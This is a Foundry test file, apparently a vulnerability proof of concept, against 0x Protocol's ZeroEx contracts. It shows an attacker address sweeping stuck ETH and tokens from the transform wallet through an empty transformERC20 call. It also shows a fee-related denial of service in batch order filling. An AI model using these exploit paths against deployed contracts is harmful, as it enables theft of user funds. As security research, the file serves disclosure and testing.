// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.6.5;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../contracts/src/ZeroEx.sol";
import "../contracts/src/features/TransformERC20Feature.sol";
import "../contracts/src/features/BatchFillNativeOrdersFeature.sol";
import "../contracts/src/features/NativeOrdersFeature.sol";
import "../contracts/src/features/MetaTransactionsFeatureV2.sol";
import "../contracts/src/features/SimpleFunctionRegistryFeature.sol";
import "../contracts/src/features/OwnableFeature.sol";
import "../contracts/src/external/FlashWallet.sol";
import "@0x/contracts-erc20/src/IEtherToken.sol";
import "../contracts/src/transformers/LibERC20Transformer.sol";
import "../contracts/src/external/FeeCollectorController.sol";

contract PoC is Test {
    ZeroEx zeroEx;
    TransformERC20Feature transformFeature;
    BatchFillNativeOrdersFeature batchFillFeature;
    NativeOrdersFeature nativeOrdersFeature;
    MetaTransactionsFeatureV2 metaTxFeature;
    SimpleFunctionRegistryFeature registryFeature;
    OwnableFeature ownableFeature;

    // Mocks
    WETH9 weth;
    MockFeeCollectorController feeCollectorController;

    function setUp() public {
        weth = new WETH9();
        feeCollectorController = new MockFeeCollectorController();

        zeroEx = new ZeroEx(address(this));

        transformFeature = new TransformERC20Feature();
        registryFeature = new SimpleFunctionRegistryFeature();
        ownableFeature = new OwnableFeature();

        nativeOrdersFeature = new NativeOrdersFeature(
            address(zeroEx),
            IEtherToken(address(weth)),
            IStaking(address(0x123)),
            FeeCollectorController(address(feeCollectorController)),
            0
        );
        batchFillFeature = new BatchFillNativeOrdersFeature(address(zeroEx));
        metaTxFeature = new MetaTransactionsFeatureV2(address(zeroEx), IEtherToken(address(weth)));

        BootstrapFeature bootstrap = BootstrapFeature(address(zeroEx));
        bytes memory data = abi.encodeWithSelector(registryFeature.bootstrap.selector);
        bootstrap.bootstrap(address(registryFeature), data);

        // Manually register OwnableFeature.owner()
        bytes4 ownerSelector = ownableFeature.owner.selector;
        uint256 proxySlotBase = uint256(1) << 128;
        bytes32 implsSlot = keccak256(abi.encode(ownerSelector, proxySlotBase));
        vm.store(address(zeroEx), implsSlot, bytes32(uint256(address(ownableFeature))));

        // Manually set owner in ZeroEx storage to address(this)
        bytes32 ownableSlot = bytes32(uint256(3) << 128);
        vm.store(address(zeroEx), ownableSlot, bytes32(uint256(address(this))));

        // Register TransformERC20Feature
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            transformFeature.transformERC20.selector,
            address(transformFeature)
        );
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            transformFeature.createTransformWallet.selector,
            address(transformFeature)
        );
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            transformFeature.getTransformWallet.selector,
            address(transformFeature)
        );

        // Initialize TransformERC20Feature
        TransformERC20Feature(address(zeroEx)).createTransformWallet();

        // Register BatchFill
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            batchFillFeature.batchFillLimitOrders.selector,
            address(batchFillFeature)
        );

        // Register NativeOrders
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            nativeOrdersFeature.fillLimitOrder.selector,
            address(nativeOrdersFeature)
        );
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            nativeOrdersFeature._fillLimitOrder.selector,
            address(nativeOrdersFeature)
        );
         SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            nativeOrdersFeature.getProtocolFeeMultiplier.selector,
            address(nativeOrdersFeature)
        );
    }

    // Vulnerability 1: Stuck ETH Sweeping
    function testPoC_StuckETHSweeping() public {
        IFlashWallet wallet = TransformERC20Feature(address(zeroEx)).getTransformWallet();

        uint256 stuckAmount = 1 ether;
        (bool success, ) = address(wallet).call{value: stuckAmount}("");
        require(success, "Failed to send ETH to wallet");

        assertEq(address(wallet).balance, stuckAmount);

        address attacker = address(0xBADD);

        IERC20Token inputToken = IERC20Token(address(0x123));
        IERC20Token outputToken = IERC20Token(LibERC20Transformer.ETH_TOKEN_ADDRESS);

        ITransformERC20Feature.Transformation[] memory transformations = new ITransformERC20Feature.Transformation[](0);

        vm.prank(attacker);
        TransformERC20Feature(address(zeroEx)).transformERC20(
            inputToken,
            outputToken,
            0,
            0,
            transformations
        );

        assertEq(attacker.balance, stuckAmount);
        assertEq(address(wallet).balance, 0);
    }

    // Vulnerability 2: Stuck Token Sweeping (Added)
    function testPoC_StuckTokenSweeping() public {
        IFlashWallet wallet = TransformERC20Feature(address(zeroEx)).getTransformWallet();
        IERC20Token token = IERC20Token(address(weth)); // Using WETH as generic token

        // Simulate stuck tokens
        uint256 stuckAmount = 1000;
        weth.deposit{value: stuckAmount}();
        weth.transfer(address(wallet), stuckAmount);

        assertEq(token.balanceOf(address(wallet)), stuckAmount);

        address attacker = address(0xBADD);

        // Input ETH, Output Token
        IERC20Token inputToken = IERC20Token(LibERC20Transformer.ETH_TOKEN_ADDRESS);
        IERC20Token outputToken = token;

        ITransformERC20Feature.Transformation[] memory transformations = new ITransformERC20Feature.Transformation[](0);

        vm.prank(attacker);
        // Send 0 ETH input
        TransformERC20Feature(address(zeroEx)).transformERC20{value: 0}(
            inputToken,
            outputToken,
            0,
            0,
            transformations
        );

        assertEq(token.balanceOf(attacker), stuckAmount);
        assertEq(token.balanceOf(address(wallet)), 0);
    }

    // Vulnerability 3: BatchFill DoS with Protocol Fees
    function testPoC_BatchFillDoS() public {
        NativeOrdersFeature nativeWithFee = new NativeOrdersFeature(
            address(zeroEx),
            IEtherToken(address(weth)),
            IStaking(address(0x123)),
            FeeCollectorController(address(feeCollectorController)),
            1337
        );

        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            nativeWithFee.fillLimitOrder.selector,
            address(nativeWithFee)
        );
        SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            nativeWithFee._fillLimitOrder.selector,
            address(nativeWithFee)
        );
         SimpleFunctionRegistryFeature(address(zeroEx)).extend(
            nativeWithFee.getProtocolFeeMultiplier.selector,
            address(nativeWithFee)
        );

        LibNativeOrder.LimitOrder[] memory orders = new LibNativeOrder.LimitOrder[](1);
        orders[0] = LibNativeOrder.LimitOrder({
            makerToken: IERC20Token(address(0)),
            takerToken: IERC20Token(address(0)),
            makerAmount: 100,
            takerAmount: 100,
            takerTokenFeeAmount: 0,
            maker: address(this),
            taker: address(0),
            sender: address(0),
            feeRecipient: address(0),
            pool: bytes32(0),
            expiry: uint64(block.timestamp + 1000),
            salt: 123
        });

        LibSignature.Signature[] memory signatures = new LibSignature.Signature[](1);
        signatures[0] = LibSignature.Signature({
            signatureType: LibSignature.SignatureType.ILLEGAL,
            v: 0,
            r: bytes32(0),
            s: bytes32(0)
        });

        uint128[] memory amounts = new uint128[](1);
        amounts[0] = 10;

        vm.txGasPrice(1 gwei);
        uint256 expectedFee = 1337 * 1 gwei;

        vm.expectRevert();
        BatchFillNativeOrdersFeature(address(zeroEx)).batchFillLimitOrders{value: expectedFee}(
            orders,
            signatures,
            amounts,
            true
        );
    }
}

contract MockFeeCollectorController {
    bytes32 public constant FEE_COLLECTOR_INIT_CODE_HASH = bytes32(uint256(1));
}

contract WETH9 is IEtherToken {
    string public constant name     = "Wrapped Ether";
    string public constant symbol   = "WETH";
    uint8  public override decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit (address indexed dst, uint wad);
    event  Withdraw(address indexed src, uint wad);

    mapping (address => uint)                       public  override balanceOf;
    mapping (address => mapping (address => uint))  public  override allowance;

    receive() external payable {
        deposit();
    }
    function deposit() public payable override {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    function withdraw(uint wad) public override {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        emit Withdraw(msg.sender, wad);
    }
    function totalSupply() public view override returns (uint) {
        return address(this).balance;
    }
    function approve(address guy, uint wad) public override returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }
    function transfer(address dst, uint wad) public override returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }
    function transferFrom(address src, address dst, uint wad)
        public
        override
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}
